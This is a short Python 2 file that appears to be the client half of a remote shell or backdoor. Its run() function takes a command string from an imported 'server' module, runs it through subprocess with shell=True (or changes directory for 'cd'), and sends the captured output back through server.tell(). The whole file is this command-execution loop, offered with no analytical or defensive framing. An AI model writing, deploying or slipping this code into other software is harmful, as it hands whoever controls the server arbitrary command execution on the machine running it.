import subprocess
import os

import server


def run():
    output = ""
    cmd = server.hello()
    if cmd.startswith("cd "):
        try:
            os.chdir(cmd.split(" ")[1])
        except OSError, err:
            output = str(err)
    else:
        try:
            proc = subprocess.Popen(cmd.split(" "), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            output = proc.stdout.read() + proc.stderr.read()
        except OSError, err:
            output = str(err)
    server.tell(output)
 